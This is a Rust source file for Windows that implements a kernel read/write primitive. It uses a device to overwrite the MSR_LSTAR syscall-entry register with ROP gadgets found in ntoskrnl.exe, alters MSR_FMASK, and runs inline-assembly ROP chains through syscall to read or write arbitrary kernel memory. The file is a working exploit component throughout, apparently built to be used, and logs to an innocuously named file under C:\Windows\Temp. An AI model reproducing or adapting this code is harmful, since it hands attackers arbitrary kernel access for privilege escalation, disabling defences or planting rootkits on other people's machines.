use anyhow::{bail, Result};
use windows_sys::Win32::System::Threading::{GetCurrentThread, SetThreadAffinityMask, SetThreadPriority};
use crate::device::{msr_read, msr_write, Device, MSR_FMASK, MSR_LSTAR};
use crate::gadgets::{scan_gadgets_in_pe, Gadgets, ReadReg};

const THREAD_PRIORITY_TIME_CRITICAL: i32 = 15;
const THREAD_PRIORITY_NORMAL: i32 = 0;

pub struct KernelRW<'a> {
    dev: &'a Device,
    gadgets: Gadgets,
    lstar_orig: u64,
    fmask_orig: u64,
    fmask_modified: bool,
}

impl<'a> KernelRW<'a> {
    pub fn setup(dev: &'a Device, pe: &[u8], nt_va: u64) -> Result<Self> {
        let gadgets = scan_gadgets_in_pe(pe, nt_va)?;
        if !gadgets.all_found() { bail!("missing ROP gadgets in ntoskrnl.exe"); }
        unsafe {
            let t = GetCurrentThread();
            SetThreadAffinityMask(t, 1);
            SetThreadPriority(t, THREAD_PRIORITY_TIME_CRITICAL);
        }
        let lstar_orig = msr_read(dev, MSR_LSTAR)?;
        let fmask_orig = msr_read(dev, MSR_FMASK)?;
        let fmask_new = fmask_orig & !(1u64 << 18);
        let fmask_modified = fmask_new != fmask_orig;
        if fmask_modified {
            msr_write(dev, MSR_FMASK, fmask_new)?;
        }
        Ok(Self { dev, gadgets, lstar_orig, fmask_orig, fmask_modified })
    }
    fn teardown(&mut self) {
        if self.fmask_modified {
            msr_write(self.dev, MSR_FMASK, self.fmask_orig).ok();
        }
        unsafe {
            let t = GetCurrentThread();
            SetThreadPriority(t, THREAD_PRIORITY_NORMAL);
            SetThreadAffinityMask(t, !0usize);
        }
    }

    #[inline(never)]
    #[allow(named_asm_labels)]
    pub fn kwrite(&self, target: u64, value: u64) -> Result<()> {
        let lstar_lo = self.lstar_orig & 0xFFFF_FFFF;
        let lstar_hi = self.lstar_orig >> 32;
        let g = &self.gadgets;

        let mut rop = vec![0u64; 13];
        rop[0]  = g.pop_rdx.unwrap();
        rop[1]  = lstar_hi;
        rop[2]  = g.pop_rax.unwrap();
        rop[3]  = lstar_lo;
        rop[4]  = g.pop_rcx.unwrap();
        rop[5]  = MSR_LSTAR as u64;
        rop[6]  = g.wrmsr_ret.unwrap();
        rop[7]  = g.iretq.unwrap();
        rop[9]  = 0x33;
        rop[12] = 0x2b;

        let rop_ptr = rop.as_mut_ptr() as u64;
        msr_write(self.dev, MSR_LSTAR, g.write_mem.unwrap())?;

        unsafe {
            std::arch::asm!(
                "leaq .L_kwrite_ret(%rip), %r10",
                "movq %r10, 64({rop})",
                "pushfq",
                "popq %r10",
                "movq %r10, 80({rop})",
                "movq %rsp, 88({rop})",
                "pushfq",
                "popq %r10",
                "orq $0x40000, %r10",
                "pushq %r10",
                "popfq",
                "movq {val}, %rax",
                "movq {tgt}, %rdx",
                "movq {rop}, %rsp",
                "syscall",
                ".L_kwrite_ret:",
                rop = in(reg) rop_ptr,
                val = in(reg) value,
                tgt = in(reg) target,
                out("rax") _, out("rcx") _, out("rdx") _, out("r8") _, out("r9") _, out("r10") _, out("r11") _,
                options(att_syntax),
            );
        }
        std::hint::black_box(&rop);

        Ok(())
    }

    #[inline(never)]
    #[allow(named_asm_labels)]
    pub fn kread(&self, src: u64) -> Result<u64> {
        let mut _log_f = std::fs::OpenOptions::new().create(true).append(true).open("C:\\Windows\\Temp\\mmdevlib_kernel.log").ok();
        let mut log_debug = |msg: &str| {
            if let Some(ref mut f) = _log_f {
                use std::io::Write;
                let _ = writeln!(f, "[kread] {}", msg);
                let _ = f.sync_all();
            }
        };

        log_debug(&format!("kread started for src 0x{:016X}", src));

        let lstar_lo = self.lstar_orig & 0xFFFF_FFFF;
        let lstar_hi = self.lstar_orig >> 32;
        let g = &self.gadgets;

        let mut result = 0u64;
        let user_buf = &mut result as *mut u64 as u64;

        let mut rop = vec![0u64; 16];
        rop[0]  = g.pop_rdx.unwrap();
        rop[1]  = user_buf;
        rop[2]  = g.write_mem.unwrap();
        rop[3]  = g.pop_rdx.unwrap();
        rop[4]  = lstar_hi;
        rop[5]  = g.pop_rax.unwrap();
        rop[6]  = lstar_lo;
        rop[7]  = g.pop_rcx.unwrap();
        rop[8]  = MSR_LSTAR as u64;
        rop[9]  = g.wrmsr_ret.unwrap();
        rop[10] = g.iretq.unwrap();
        rop[12] = 0x33;
        rop[15] = 0x2b;

        let rop_ptr = rop.as_mut_ptr() as u64;
        let (read_mem_va, read_reg) = g.read_mem.unwrap();
        log_debug(&format!("writing read_mem_va 0x{:016X} to LSTAR", read_mem_va));
        msr_write(self.dev, MSR_LSTAR, read_mem_va)?;

        log_debug("Executing ROP chain for kread...");
        unsafe {
            match read_reg {
                ReadReg::Rax => {
                    std::arch::asm!(
                        "leaq .L_kread_ret_rax(%rip), %r10",
                        "movq %r10, 88({rop})",
                        "pushfq",
                        "popq %r10",
                        "movq %r10, 104({rop})",
                        "movq %rsp, 112({rop})",
                        "pushfq",
                        "popq %r10",
                        "orq $0x40000, %r10",
                        "pushq %r10",
                        "popfq",
                        "movq {src}, %rax",
                        "movq {rop}, %rsp",
                        "syscall",
                        ".L_kread_ret_rax:",
                        rop = in(reg) rop_ptr,
                        src = in(reg) src,
                        out("rax") _, out("rcx") _, out("rdx") _, out("r8") _, out("r9") _, out("r10") _, out("r11") _,
                        options(att_syntax),
                    );
                },
                ReadReg::Rdx => {
                    std::arch::asm!(
                        "leaq .L_kread_ret_rdx(%rip), %r10",
                        "movq %r10, 88({rop})",
                        "pushfq",
                        "popq %r10",
                        "movq %r10, 104({rop})",
                        "movq %rsp, 112({rop})",
                        "pushfq",
                        "popq %r10",
                        "orq $0x40000, %r10",
                        "pushq %r10",
                        "popfq",
                        "movq {src}, %rdx",
                        "movq {rop}, %rsp",
                        "syscall",
                        ".L_kread_ret_rdx:",
                        rop = in(reg) rop_ptr,
                        src = in(reg) src,
                        out("rax") _, out("rcx") _, out("rdx") _, out("r8") _, out("r9") _, out("r10") _, out("r11") _,
                        options(att_syntax),
                    );
                },
                ReadReg::R8 => {
                    std::arch::asm!(
                        "leaq .L_kread_ret_r8(%rip), %r10",
                        "movq %r10, 88({rop})",
                        "pushfq",
                        "popq %r10",
                        "movq %r10, 104({rop})",
                        "movq %rsp, 112({rop})",
                        "pushfq",
                        "popq %r10",
                        "orq $0x40000, %r10",
                        "pushq %r10",
                        "popfq",
                        "movq {src}, %r8",
                        "movq {rop}, %rsp",
                        "syscall",
                        ".L_kread_ret_r8:",
                        rop = in(reg) rop_ptr,
                        src = in(reg) src,
                        out("rax") _, out("rcx") _, out("rdx") _, out("r8") _, out("r9") _, out("r10") _, out("r11") _,
                        options(att_syntax),
                    );
                },
                ReadReg::R9 => {
                    std::arch::asm!(
                        "leaq .L_kread_ret_r9(%rip), %r10",
                        "movq %r10, 88({rop})",
                        "pushfq",
                        "popq %r10",
                        "movq %r10, 104({rop})",
                        "movq %rsp, 112({rop})",
                        "pushfq",
                        "popq %r10",
                        "orq $0x40000, %r10",
                        "pushq %r10",
                        "popfq",
                        "movq {src}, %r9",
                        "movq {rop}, %rsp",
                        "syscall",
                        ".L_kread_ret_r9:",
                        rop = in(reg) rop_ptr,
                        src = in(reg) src,
                        out("rax") _, out("rcx") _, out("rdx") _, out("r8") _, out("r9") _, out("r10") _, out("r11") _,
                        options(att_syntax),
                    );
                }
            }
        }
        std::hint::black_box(&rop);
        log_debug("ROP chain executed.");

        let val = unsafe { std::ptr::read_volatile(&result as *const u64) };
        log_debug(&format!("kread returning 0x{:016X}", val));
        Ok(val)
    }
}

impl Drop for KernelRW<'_> {
    fn drop(&mut self) { self.teardown(); }
}
